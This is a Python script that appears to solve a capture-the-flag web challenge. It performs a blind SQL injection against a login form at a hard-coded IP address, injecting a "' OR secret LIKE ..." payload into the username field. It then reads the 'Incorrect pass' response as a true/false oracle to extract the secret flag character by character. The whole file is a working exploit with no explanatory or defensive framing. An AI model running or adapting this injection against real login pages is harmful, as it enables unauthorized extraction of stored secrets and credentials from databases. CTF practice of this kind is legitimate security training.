#!/usr/bin/env python3
import sys
import urllib.parse
import urllib.request


BASE = sys.argv[1] if len(sys.argv) > 1 else "http://95.111.234.103:33097"
LOGIN_URL = f"{BASE.rstrip('/')}/login"


def login(username: str, password: str = "") -> str:
    body = urllib.parse.urlencode({"username": username, "password": password}).encode()
    req = urllib.request.Request(LOGIN_URL, data=body, headers={"User-Agent": "solve"})
    with urllib.request.urlopen(req, timeout=12) as resp:
        return resp.read().decode("utf-8", "ignore")


def oracle_prefix(prefix: str) -> bool:
    # True branch => row exists => returns "{-} Incorrect pass!" with empty password.
    payload = f"' OR secret LIKE '{prefix}%' -- -"
    res = login(payload, "")
    return "Incorrect pass" in res


def recover_flag() -> str:
    starters = ["novruzctf{", "flag{", "Cup{"]
    prefix = ""
    for s in starters:
        if oracle_prefix(s):
            prefix = s
            break
    if not prefix:
        raise RuntimeError("Could not detect flag prefix")

    flag = prefix
    charset = "0123456789abcdef}"
    for _ in range(200):
        if flag.endswith("}"):
            return flag
        found = False
        for ch in charset:
            candidate = flag + ch
            if oracle_prefix(candidate):
                flag = candidate
                found = True
                break
        if not found:
            raise RuntimeError(f"Stuck at prefix: {flag}")
    raise RuntimeError("Max length reached")


def main() -> None:
    print(recover_flag())


if __name__ == "__main__":
    main()
